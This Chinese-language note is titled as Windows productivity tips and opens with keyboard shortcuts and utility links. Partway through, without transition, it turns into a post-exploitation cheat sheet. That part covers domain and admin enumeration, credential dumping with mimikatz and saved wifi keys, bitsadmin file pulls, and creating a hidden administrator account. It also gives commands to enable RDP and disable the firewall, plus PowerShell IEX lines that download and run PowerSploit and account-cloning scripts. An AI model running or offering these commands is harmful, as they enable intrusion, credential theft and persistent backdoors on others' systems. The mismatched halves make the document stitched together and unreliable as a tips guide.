# title{windows-skill - windows下那些提高效率的技巧}

不管是linux还是mac亦或者是windows下都那么一些实用的小技巧能极大的提升工作额效率,对于一个
长期在电脑前面工作的人这些技巧实在太有用了！

# 常用的快捷
* win + d 显示桌面
* win + R 运行
* win + E 资源管理器
* WIN + L 锁屏
* Win + Tab 切换程序
* CTRL + W 关闭资源管理器
* CTRL + HOME 跳到文件头
* CTRL + END  调到文件末尾
* alt +双击   查看文件属性
* SHIFT+鼠标右键 可以在当前路径下打开DOS窗口
* CTRL+SHIFT+ESC 打开进程管理器
* WIN + 右箭头 当前窗口放为屏幕一般靠屏幕右侧
* WIN + 左箭头 当前窗口缩放为屏幕的一半，靠屏幕左侧显示
* WIN + 上箭头 最大化当前窗口
* WIN + 下箭头：还原和最小化当前窗口
* WIN+R 输入“msconfig”，弹出系统设置界面，可设置禁止、允许进程开机自启动
* WIN+R，输入“psr”后回车：打开步骤记录器
* WIN+R，输入“mip”，启动数学公式手写板
* WIN+Home：最小化所有窗口，除了当前激活窗口
* WIN+M：最小化所有窗口
* WIN+SHIFT+M：还原最小化窗口到桌面上
* WIN+P：选择一个演示文稿显示模式
* WIN+Pause：显示系统属性对话框

# 本地磁盘搜索工具
Everything：http://www.voidtools.com/
Listary：http://www.listary.com/
光速搜索：http://finder.sdo.com/
百度硬盘：http://disk.baidu.com/
Alfred(Mac)：http://www.alfredapp.com
# 资源管理工具
Total Commander：http://www.ghisler.com/
Clover：http://cn.ejie.me/

# 个人知识管理工具
有道云笔记：http://note.youdao.com/
麦库记事：http://note.sdo.com/
为知笔记：http://www.wiz.cn/
Evernote：http://www.yinxiang.com/

# 源码阅读工具
Source insight：http://sourceinsight.com/
Vim：http://www.vim.org/

# 文件工具
Beyond Compare：http://www.scootersoftware.com/
Winhex：http://winhex.en.softonic.com/
UltraEdit：http://www.ultraedit.com/


# 思维导图工具
Mindjet：http://www.mindjet.com/

# 其它
wiz mouse 一块可以将鼠标进行复制的软件
ColorPix：http://www.colorschemer.com/colorpix_info.php
F.lux(屏幕颜色自动调整工具)：https://justgetflux.com
Ditto(Windows 增强版剪贴板工具)：http://ditto-cp.sourceforge.net
FreeFileSync(Windows 文件同步工具)：http://sourceforge.net/projects/freefilesync/
Altrun(快速启动软件)：http://altrun.googlecode.com
Auto Hot Key(快捷键管理工具)：http://www.autohotkey.com/
SourceCounter(代码行数统计工具)：https://code.google.com/p/boomworks/wiki/SourceCounterCN
PicPick(截屏)：http://www.picpick.org/en/
tinypng(png图片压缩)：https://tinypng.com/
LICEcap(屏幕录制生成gif动态图工具)：http://www.cockos.com/licecap/

query user || qwinsta 查看当前在线用户

net user  查看本机用户

net user /domain 查看域用户

net view & net group "domain computers" /domain 查看当前域计算机列表 第二个查的更多

net view /domain 查看有几个域

net view \\\\dc   查看 dc 域内共享文件

net group /domain 查看域里面的组

net group "domain admins" /domain 查看域管

net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管

net group "domain controllers" /domain 域控

net time /domain

net config workstation   当前登录域 - 计算机名 - 用户名

net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源

ipconfig

systeminfo

tasklist /svc

tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist

net localgroup administrators && whoami 查看当前是不是属于管理组

netstat -ano

nltest /dclist:xx  查看域控

whoami /all 查看 Mandatory Label uac 级别和 sid 号

net sessoin 查看远程连接 session (需要管理权限)

net share     共享目录

cmdkey /l   查看保存登陆凭证

echo %logonserver%  查看登陆域

spn –l administrator spn 记录

set  环境变量

dsquery server - 查找目录中的 AD DC/LDS 实例

dsquery user - 查找目录中的用户

dsquery computer 查询所有计算机名称 windows 2003

dir /s *.exe 查找指定目录下及子目录下没隐藏文件

arp -a
发现远程登录密码等密码 netpass.exe  下载地址：

https://www.nirsoft.net/utils/network_password_recovery.html获取 window vpn 密码：
mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit  wifi 密码：
netsh wlan show profile 查处 wifi 名

netsh wlan show profile WiFi-name key=clear 获取对应 wifi 的密码ie 代理
reg query "HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet

Settings" /v ProxyServer

reg query "HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet Settings"pac 代理
reg query "HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet

Settings" /v AutoConfigURL   //引子 t0stmailpowershell-nishang
https://github.com/samratashok/nishang
其他常用命令
ping       icmp 连通性

nslookup www.baidu.com vps-ip dns 连通性

dig @vps-ip www.baidu.com

curl vps:8080  http 连通性

tracert

bitsadmin /transfer n http://ip/xx.exe C:\windows\temp\x.exe一种上传文件 >= 2008

fuser -nv tcp 80 查看端口 pid

rdesktop -u username ip linux 连接 win 远程桌面 (有可能不成功)

where file win 查找文件是否存在

找路径，Linux 下使用命令 find -name *.jsp 来查找，Windows 下，使用 for /r c:\windows\temp\ %i in (file lsss.dmp) do @echo %i

netstat -apn | grep 8888   kill -9 PID   查看端口并 kill
远程登录内网主机
判断是内网，还是外网，内网转发到 vps

netstat -ano   没有开启 3389 端口,复查下

tasklist /svc,查 svchost.exe 对应的 TermService 的 pid,看 netstat 相等的 pid 即 3389 端口.
在主机上添加账号
net user admin1 admin1 /add & net localgroup administrators admin1 /add
如不允许远程连接，修改注册表

REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许 3389 端口，命令如下:

netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
关闭防火墙

netsh firewall set opmode mode=disable
3389user 无法添加:

http://www.91ri.org/5866.html
**隐藏 win 账户**

开启 sys 权限 cmd:

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'
add user 并隐藏:

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1')
win server 有密码强度要求，改为更复杂密码即可:

渗透技巧——Windows 系统的帐户隐藏

https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/
windows 的 RDP 连接记录:

http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/

应用程序日志,安全日志,系统日志,DNS日志
%systemroot%\system32\config,默认文件大小512KB小.
安全日志文件:
%systemroot%\system32\config\SecEvent.EVT
系统日志文件:
%systemroot%\system32\config\SysEvent.EVT
应用程序日志文件:
%systemroot%\system32\config\AppEvent.EVT
Internet信息服务日志
FTP日志默认位置:
%systemroot%\system32\logfiles\msftpsvc1\ \\默认每天一个日志
WWW日志默认位置:
%systemroot%\system32\logfiles\w3svc1\ \\默认每天一个日志
Scheduler服务日志
默认位置:%systemroot%\schedlgu.txt
日志在注册表里的键
应用程序日志,安全日志,系统日志,DNS服务器日志,它们这些LOG文件在注册表中的:
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Eventlog
Schedluler服务日志在注册表中:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent